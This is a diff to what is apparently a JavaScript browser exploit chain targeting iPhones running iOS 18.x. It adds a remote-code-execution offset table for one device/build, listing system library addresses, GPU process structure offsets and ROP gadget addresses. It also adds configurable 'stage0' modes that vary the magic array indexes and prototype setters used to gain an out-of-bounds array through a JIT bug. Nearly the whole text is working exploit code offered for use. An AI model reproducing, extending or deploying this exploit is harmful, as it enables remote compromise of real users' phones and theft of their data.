@@ -27,6 +27,113 @@ BigInt.prototype.asInt32s = function() {
 [].shift();
 /* HEADERS END */
 rce_offsets = {
+   "iPhone15,4_22E240": {
+      AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1ee8de358n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker: 0x1ee8dde40n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest: 0x1ee8ddda0n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice: 0x1ee8dddf0n,
+      AVFAudio__OBJC_CLASS__AVSpeechUtterance: 0x1ee8dd1e8n,
+      AVFAudio__cfstr_SystemLibraryTextToSpeech: 0x1ec792358n,
+      AXCoreUtilities__DefaultLoader: 0x1ec59b9b0n,
+      CAPointer: 0x20n,
+      CFNetwork__gConstantCFStringValueTable: 0x1ef76dea0n,
+      CGContextDelegate: 0x28n,
+      CMPhoto__CMPhotoCompressionCreateContainerFromImageExt: 0x1abfd53b4n,
+      CMPhoto__CMPhotoCompressionCreateDataContainerFromImage: 0x1abfd550cn,
+      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage: 0x1abf4fd1cn,
+      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1abfa554cn,
+      CMPhoto__CMPhotoCompressionSessionAddCustomMetadata: 0x1abfa5ab0n,
+      CMPhoto__CMPhotoCompressionSessionAddExif: 0x1abfa566cn,
+      CMPhoto__kCMPhotoTranscodeOption_Strips: 0x1e8dc26e8n,
+      DesktopServicesPriv_bss: 0x1eda56fc8n,
+      Foundation__NSBundleTables_bundleTables_value: 0x18184ff38n,
+      GPUConnectionToWebProcess_m_remoteGraphicsContextGLMap: 0xf0n,
+      GPUProcess_singleton: 0x1ec703b18n,
+      GetCurrentThreadTLSIndex_CurrentThreadIndex: 0x1ef629b90n,
+      HOMEUI_cstring: 0x182f8f696n,
+      IOSurfaceContextDelegate: 0x120n,
+      IOSurfaceDrawable: 0x150n,
+      IOSurfaceQueue: 0x48n,
+      ImageIO__IIOLoadCMPhotoSymbols: 0x1886ce850n,
+      ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt: 0x1ee7bdbb0n,
+      ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage: 0x1ee7bd860n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage: 0x1ee7bd868n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1ee7bd870n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata: 0x1ee7bd7b0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddExif: 0x1ee7bd878n,
+      ImageIO__gImageIOLogProc: 0x1ef7f8160n,
+      JavaScriptCore__globalFuncParseFloat: 0x19a5e52b0n,
+      JavaScriptCore__jitAllowList: 0x1f0ddc140n,
+      JavaScriptCore__jitAllowList_once: 0x1f0ddbf58n,
+      MediaAccessibility__MACaptionAppearanceGetDisplayType: 0x1ba7dcac8n,
+      PerfPowerServicesReader_cstring: 0x2573ffe60n,
+      RemoteGraphicsContextGLWorkQueue: 0x1ee85de18n,
+      RemoteRenderingBackendProxy_off: 0x830n,
+      Security__SecKeychainBackupSyncable_block_invoke: 0x18b5e3eb0n,
+      Security__SecOTRSessionProcessPacketRemote_block_invoke: 0x18b5f8180n,
+      Security__gSecurityd: 0x1ec45fbf8n,
+      TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit: 0x1eeb904c8n,
+      UI_m_connection: 0x28n,
+      WebCore__DedicatedWorkerGlobalScope_vtable: 0x1f21d4998n,
+      WebCore__PAL_getPKContactClass: 0x1ee862078n,
+      WebCore__TelephoneNumberDetector_phoneNumbersScanner_value: 0x197e35e9cn,
+      WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts: 0x1ec6b8818n,
+      WebCore__initPKContact_once: 0x1ee86abd0n,
+      WebCore__initPKContact_value: 0x1ee86abd8n,
+      WebCore__softLinkDDDFACacheCreateFromFramework: 0x1ee869378n,
+      WebCore__softLinkDDDFAScannerFirstResultInUnicharArray: 0x1ee869370n,
+      WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType: 0x1ee869360n,
+      WebCore__softLinkOTSVGOTSVGTableRelease: 0x1ef9844e8n,
+      WebProcess_ensureGPUProcessConnection: 0x198f16f90n,
+      WebProcess_gpuProcessConnectionClosed: 0x199862d04n,
+      WebProcess_singleton: 0x1ee85efc0n,
+      __pthread_head: 0x269198020n,
+      dyld__RuntimeState_emptySlot: 0x1a966f928n,
+      dyld__RuntimeState_vtable: 0x1f36beef0n,
+      dyld__dlopen_from_lambda_ret: 0x1a96519d8n,
+      dyld__signPointer: 0x1a96401e0n,
+      emptyString: 0x1f229c458n,
+      free_slabs: 0x1ee7a4990n,
+      gadget_control_1_ios184: 0x23eb112ecn,
+      gadget_control_2_ios184: 0x1a964def8n,
+      gadget_control_3_ios184: 0x21eda1f24n,
+      gadget_loop_1_ios184: 0x18660a5a4n,
+      gadget_loop_2_ios184: 0x20d0ceb28n,
+      gadget_loop_3_ios184: 0x184d6ad9cn,
+      gadget_set_all_registers_ios184: 0x20db4e20cn,
+      jsc_base: 0x198ce8000n,
+      libARI_cstring: 0x218616820n,
+      libGPUCompilerImplLazy__invoker: 0x23c8b835cn,
+      libGPUCompilerImplLazy_cstring: 0x23ba02870n,
+      libdyld__dlopen: 0x1a964fa88n,
+      libdyld__dlsym: 0x1a9645220n,
+      libdyld__gAPIs: 0x1ee3b8000n,
+      libsystem_c__atexit_mutex: 0x1ee6c9c58n,
+      libsystem_kernel__thread_suspend: 0x1d379d1c0n,
+      libsystem_pthread_base: 0x20d11d000n,
+      libsystem_pthread_linkedit: 0x271680000n,
+      m_backend: 0x70n,
+      m_drawingArea: 0x50n,
+      m_gpuProcessConnection: 0x158n,
+      m_gpuProcessConnection_m_identifier: 0x38n,
+      m_imageBuffer: 0x18n,
+      m_isRenderingSuspended: 0xe8n,
+      m_platformContext: 0x38n,
+      m_remoteDisplayLists: 0x70n,
+      m_remoteRenderingBackendMap: 0xe8n,
+      m_webProcessConnections: 0x80n,
+      mach_task_self_ptr: 0x1ee6c8ec0n,
+      mainRunLoop: 0x1ee92c020n,
+      privateState_off: 0x7e8n,
+      pthread_create: 0x20d122864n,
+      pthread_create_auth_stubs_offset: 0x2c67640n,
+      pthread_create_jsc: 0x19b94f640n,
+      pthread_create_offset: 0x5864n,
+      runLoopHolder_tid: 0x1ee93c708n,
+      rxBufferMtl_off: 0x100n,
+      rxMtlBuffer_off: 0x70n,
+      vertexAttribVector_off: 0x2548n,
+   },
    "iPhone15,2_22E240": {
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1ee8de198n,
       AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker: 0x1ee8ddc80n,
@@ -14479,7 +14586,7 @@ const device_chipset = {
             if (!isFinite(major) || !isFinite(minor)) return false;
             return major == 18 && minor < 4;
         }
-        const stage0_modes = ["orig", "keep-result", "call-keep-result", "jit-ignore", "jit-extract", "shape-start29", "shape-start31", "shape-insert8", "shape-len31", "shape-len33"];
+        const stage0_modes = ["orig", "keep-result", "call-keep-result", "jit-ignore", "jit-extract", "shape-start29", "shape-start31", "shape-insert8", "shape-len31", "shape-len33", "tail-128508", "tail-128572", "tail-128700", "setter-down", "setter-up"];
         let requested_stage0_mode = getStage0Mode();
         let stage0_probe_allowed = supportsStage0Probe();
         let stage0_mode = stage0_probe_allowed ? (requested_stage0_mode || "probe") : "orig";
@@ -14489,7 +14596,7 @@ const device_chipset = {
             stage0_mode = "orig";
         }
         const getStage0Config = (mode) => {
-            let cfg = { target_length: 32, splice_start: 30, insert_values: [1,2,3,4,5,6,7] };
+            let cfg = { target_length: 32, splice_start: 30, insert_values: [1,2,3,4,5,6,7], magic_tail: 128636, setter_magic: 128661, setter_holes: 128662 };
             if (mode == "shape-start29") cfg.splice_start = 29;
             else if (mode == "shape-start31") cfg.splice_start = 31;
             else if (mode == "shape-insert8") cfg.insert_values = [1,2,3,4,5,6,7,8];
@@ -14499,6 +14606,24 @@ const device_chipset = {
             } else if (mode == "shape-len33") {
                 cfg.target_length = 33;
                 cfg.splice_start = 31;
+            } else if (mode == "tail-128508") {
+                cfg.magic_tail = 128508;
+                cfg.setter_magic = 128533;
+                cfg.setter_holes = 128534;
+            } else if (mode == "tail-128572") {
+                cfg.magic_tail = 128572;
+                cfg.setter_magic = 128597;
+                cfg.setter_holes = 128598;
+            } else if (mode == "tail-128700") {
+                cfg.magic_tail = 128700;
+                cfg.setter_magic = 128725;
+                cfg.setter_holes = 128726;
+            } else if (mode == "setter-down") {
+                cfg.setter_magic = 128660;
+                cfg.setter_holes = 128661;
+            } else if (mode == "setter-up") {
+                cfg.setter_magic = 128662;
+                cfg.setter_holes = 128663;
             }
             return cfg;
         }
@@ -14562,6 +14687,9 @@ const device_chipset = {
         const oob_object_target_length = stage0_cfg.target_length;
         const stage0_splice_start = stage0_cfg.splice_start;
         const stage0_insert_values = stage0_cfg.insert_values;
+        const stage0_magic_tail = stage0_cfg.magic_tail;
+        const stage0_setter_magic = stage0_cfg.setter_magic;
+        const stage0_setter_holes = stage0_cfg.setter_holes;
         const holes_to_add = Math.max(0, oob_object_target_length - stage0_splice_start);
 
         for (let j = 6 ; j < victim_array_allocations_in_page; j++){
@@ -14621,7 +14749,7 @@ const device_chipset = {
         let counter = 0;
         let hole_setter_counter = 0;
         let double_magic_counter = 0;
-        otherGlobalObject.Object.defineProperty(otherGlobalObject.Array.prototype, 128661, {set() {counter++; if (counter == 1) { doDoubleMagic();} return 42;}}); null;
+        otherGlobalObject.Object.defineProperty(otherGlobalObject.Array.prototype, stage0_setter_magic, {set() {counter++; if (counter == 1) { doDoubleMagic();} return 42;}}); null;
 
         const doDoubleMagic = () => {
             double_magic_counter++;
@@ -14634,7 +14762,7 @@ const device_chipset = {
             let regexp = new otherGlobalObject.RegExp('a', 'g');
             let a = new otherGlobalObject.String('a');
             let newmagic = a.match(regexp);
-            let magic_indexes = new otherGlobalObject.Array(498, 1003, 2008, 4018, 8038, 16078, 32158, 64318, 128636);
+            let magic_indexes = new otherGlobalObject.Array(498, 1003, 2008, 4018, 8038, 16078, 32158, 64318, stage0_magic_tail);
             for (let i of magic_indexes) { 
                 newmagic[i] = 1;
             }
@@ -14642,7 +14770,7 @@ const device_chipset = {
             return newmagic;
         }
 
-        otherGlobalObject.Object.defineProperty(otherGlobalObject.Array.prototype, 128662, {set(v) {hole_setter_counter++; for(let i = 0; i < holes_to_add; i++){ the_oob_object[0] = v;} return 42;}}); null;
+        otherGlobalObject.Object.defineProperty(otherGlobalObject.Array.prototype, stage0_setter_holes, {set(v) {hole_setter_counter++; for(let i = 0; i < holes_to_add; i++){ the_oob_object[0] = v;} return 42;}}); null;
 
         otherGlobalObject.dontjitme_contigious();
         dontjitme_float();
@@ -14664,7 +14792,7 @@ const device_chipset = {
         }
 
         const jit_wait_ms = wait_for_jit_compilation_ms;
-        print(`stage0 setup: attempt=${attempt_idx + 1} jit_wait_ms=${jit_wait_ms} stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} splice_start=${stage0_splice_start} insert_count=${stage0_insert_values.length} holes_to_add=${holes_to_add} magic_tail=128636`);
+        print(`stage0 setup: attempt=${attempt_idx + 1} jit_wait_ms=${jit_wait_ms} stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} splice_start=${stage0_splice_start} insert_count=${stage0_insert_values.length} holes_to_add=${holes_to_add} magic_tail=${stage0_magic_tail} setter_magic=${stage0_setter_magic} setter_holes=${stage0_setter_holes}`);
 
         return sleep(jit_wait_ms).then(() => {
 
@@ -14715,7 +14843,7 @@ const device_chipset = {
                     }
                 }
                 if(oob_array_idx === undefined){
-                    this.failStage("stage0", `no oversized victim array after splice; stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} splice_result_len=${splice_result_len} splice_observed=${splice_observed} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} splice_start=${stage0_splice_start} insert_count=${stage0_insert_values.length} holes_to_add=${holes_to_add} magic_tail=128636 threshold>${victim_array_allocation_size*10} max_length=${max_victim_length} max_idx=${max_victim_idx} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
+                    this.failStage("stage0", `no oversized victim array after splice; stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} splice_result_len=${splice_result_len} splice_observed=${splice_observed} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} splice_start=${stage0_splice_start} insert_count=${stage0_insert_values.length} holes_to_add=${holes_to_add} magic_tail=${stage0_magic_tail} setter_magic=${stage0_setter_magic} setter_holes=${stage0_setter_holes} threshold>${victim_array_allocation_size*10} max_length=${max_victim_length} max_idx=${max_victim_idx} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
                     return false;
                 }
                 oob_array = victim_list[oob_array_idx];
@@ -14727,7 +14855,7 @@ const device_chipset = {
                     }
                 }
                 if(overlap_array_idx === undefined){
-                    this.failStage("stage0", `oversized victim found but egg scan failed; stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} splice_result_len=${splice_result_len} splice_observed=${splice_observed} oob_array_idx=${oob_array_idx} oob_length=${oob_array.length} target_length=${oob_object_target_length} splice_start=${stage0_splice_start} insert_count=${stage0_insert_values.length} scan_limit=${victim_array_allocation_size*10} egg1=0x${egg1.toString(16)} egg2=0x${egg2.toString(16)} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
+                    this.failStage("stage0", `oversized victim found but egg scan failed; stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} splice_result_len=${splice_result_len} splice_observed=${splice_observed} oob_array_idx=${oob_array_idx} oob_length=${oob_array.length} target_length=${oob_object_target_length} splice_start=${stage0_splice_start} insert_count=${stage0_insert_values.length} magic_tail=${stage0_magic_tail} setter_magic=${stage0_setter_magic} setter_holes=${stage0_setter_holes} scan_limit=${victim_array_allocation_size*10} egg1=0x${egg1.toString(16)} egg2=0x${egg2.toString(16)} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
                     return false;
                 }
                 this.oob_array = oob_array;
